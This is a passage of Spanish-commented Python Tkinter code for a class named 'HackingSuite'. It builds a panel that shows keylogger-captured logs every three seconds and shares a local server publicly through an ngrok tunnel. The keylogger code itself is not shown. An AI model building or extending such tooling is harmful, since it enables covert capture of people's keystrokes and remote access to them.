        ttk.Label(link_frame, text="🔗 Link para compartir en red local:", font=('Arial', 10, 'bold')).pack(side=tk.LEFT, padx=5)
        
        self.link_entry = ttk.Entry(link_frame, width=35, font=('Arial', 10))
        self.link_entry.insert(0, link_completo)
        self.link_entry.pack(side=tk.LEFT, padx=5)
        self.link_entry.config(state='readonly')
        
        btn_copy_link = ttk.Button(link_frame, text="📋 Copiar link", command=self.copiar_link_completo)
        btn_copy_link.pack(side=tk.LEFT, padx=5)
        
        ttk.Label(frame, text=f"🌐 Tu IP local: {ip_local}:3000", foreground='blue', font=('Arial', 9)).pack(pady=2)

        ttk.Separator(frame, orient='horizontal').pack(fill='x', pady=10)

        ngrok_frame = ttk.LabelFrame(frame, text="Compartir con compañero usando ngrok (internet)", padding=5)
        ngrok_frame.pack(fill=tk.X, pady=5)
        ttk.Label(ngrok_frame, text="Asegúrate de tener ngrok instalado y autenticado.\n(Si no: sudo snap install ngrok; ngrok config add-authtoken TU_TOKEN)",
                  justify='center', foreground='gray').pack(pady=2)
        self.btn_ngrok = ttk.Button(ngrok_frame, text="Iniciar ngrok (puerto 3000)", command=self.iniciar_ngrok)
        self.btn_ngrok.pack(pady=5)
        self.btn_stop_ngrok = ttk.Button(ngrok_frame, text="Detener ngrok", command=self.detener_ngrok, state='disabled')
        self.btn_stop_ngrok.pack(pady=5)
        self.ngrok_url_label = ttk.Label(ngrok_frame, text="", foreground='blue')
        self.ngrok_url_label.pack(pady=5)
        self.btn_copy_url = ttk.Button(ngrok_frame, text="Copiar URL pública", command=self.copiar_url_ngrok, state='disabled')
        self.btn_copy_url.pack(pady=5)
        self.ngrok_output = scrolledtext.ScrolledText(ngrok_frame, height=4, width=80)
        self.ngrok_output.pack(pady=5, fill=tk.X)

        ttk.Separator(frame, orient='horizontal').pack(fill='x', pady=10)

        logs_frame = ttk.LabelFrame(frame, text="Logs capturados (actualización automática cada 3 segundos)", padding=5)
        logs_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        self.logs_text = scrolledtext.ScrolledText(logs_frame, height=15, width=80, wrap=tk.WORD)
        self.logs_text.pack(fill=tk.BOTH, expand=True)
        btn_refresh = ttk.Button(logs_frame, text="Actualizar ahora", command=lambda: actualizar_logs_keylogger(self.logs_text))
        btn_refresh.pack(pady=5)

        iniciar_actualizacion_logs(self.logs_text, intervalo=3000)

        self.ngrok_tunnel = None

    def copiar_link_completo(self):
        """Copia el link completo al portapapeles"""
        link = self.link_entry.get()
        pyperclip.copy(link)
        messagebox.showinfo("Link copiado", f"Link copiado al portapapeles:\n{link}\n\n¡Compártelo con tu compañero en la misma red!")

    def iniciar_ngrok(self):
        if self.ngrok_tunnel is not None:
            messagebox.showwarning("ngrok", "ngrok ya está siendo gestionado por la app.")
            return
        self.ngrok_output.delete(1.0, tk.END)
        self.ngrok_output.insert(tk.END, "Verificando si hay un túnel ngrok activo...\n")
        self.btn_ngrok.config(state='disabled', text="Verificando...")
        self.btn_stop_ngrok.config(state='disabled')

        def detectar_tunel_existente():
            try:
                import requests
                response = requests.get("http://127.0.0.1:4040/api/tunnels", timeout=2)
                if response.status_code == 200:
                    data = response.json()
                    tunnels = data.get("tunnels", [])
                    for t in tunnels:
                        if t.get("proto") in ("https", "http"):
                            public_url = t.get("public_url")
                            if public_url:
                                self.root.after(0, lambda u=public_url: self.mostrar_url_ngrok(u))
                                self.ngrok_tunnel = "manual"
                                self.root.after(0, lambda: self.btn_stop_ngrok.config(state='normal'))
                                self.root.after(0, lambda: self.ngrok_output.insert(tk.END, f"✅ Túnel existente detectado: {public_url}\n"))
                                self.root.after(0, lambda: self.btn_ngrok.config(state='disabled', text="ngrok activo"))
                                return
            except Exception:
                pass

            try:
                from pyngrok import ngrok
                self.root.after(0, lambda: self.ngrok_output.insert(tk.END, "No se encontró túnel activo. Iniciando uno nuevo...\n"))
                self.ngrok_tunnel = ngrok.connect(3000, "http")
                public_url = self.ngrok_tunnel.public_url
                self.root.after(0, lambda: self.ngrok_output.insert(tk.END, f"✅ Túnel creado: {public_url}\n"))
                self.root.after(0, lambda u=public_url: self.mostrar_url_ngrok(u))
                self.root.after(0, lambda: self.btn_stop_ngrok.config(state='normal'))
            except ImportError:
                self.root.after(0, lambda: self.ngrok_output.insert(tk.END, "❌ pyngrok no instalado. Instálalo con: pip install pyngrok\n"))
                self.root.after(0, lambda: self.btn_ngrok.config(state='normal', text="Iniciar ngrok (puerto 3000)"))
            except Exception as e:
                error_msg = str(e)
                self.root.after(0, lambda msg=error_msg: self.ngrok_output.insert(tk.END, f"❌ Error al crear túnel: {msg}\n"))
                self.root.after(0, lambda: self.btn_ngrok.config(state='normal', text="Iniciar ngrok (puerto 3000)"))

        threading.Thread(target=detectar_tunel_existente, daemon=True).start()

    def detener_ngrok(self):
        if self.ngrok_tunnel is None:
            messagebox.showinfo("Info", "No hay ningún túnel activo gestionado por la app.")
            return
        if self.ngrok_tunnel == "manual":
            self.ngrok_output.insert(tk.END, "⚠️ Este túnel fue iniciado manualmente. Ciérralo con 'pkill ngrok' si deseas.\n")
            return
        try:
            from pyngrok import ngrok
            ngrok.disconnect(self.ngrok_tunnel.public_url)
            if not ngrok.get_tunnels():
                ngrok.kill()
            self.ngrok_tunnel = None
            self.ngrok_output.insert(tk.END, "🛑 Túnel ngrok detenido.\n")
            self.ngrok_url_label.config(text="")
            self.btn_copy_url.config(state='disabled')
            self.btn_ngrok.config(state='normal', text="Iniciar ngrok (puerto 3000)")
            self.btn_stop_ngrok.config(state='disabled')
        except Exception as e:
            self.ngrok_output.insert(tk.END, f"Error al detener: {e}\n")

    def mostrar_url_ngrok(self, url):
        self.ngrok_url_label.config(text=f"URL pública: {url}")
        self.btn_copy_url.config(state='normal')
        self.btn_ngrok.config(state='disabled', text="ngrok activo")
        self.btn_stop_ngrok.config(state='normal')
        self.ngrok_output.insert(tk.END, f"\n✅ URL pública: {url}\n")
        self.ngrok_output.see(tk.END)

    def copiar_url_ngrok(self):
        texto = self.ngrok_url_label.cget("text")
        if texto.startswith("URL pública:"):
            url = texto.replace("URL pública:", "").strip()
            pyperclip.copy(url)
            messagebox.showinfo("Copiado", "URL pública copiada al portapapeles.\nCompártela con tu compañero.")
        else:
            messagebox.showwarning("Aviso", "No hay URL válida para copiar.")

if __name__ == "__main__":
    root = tk.Tk()
    app = HackingSuite(root)
    root.mainloop()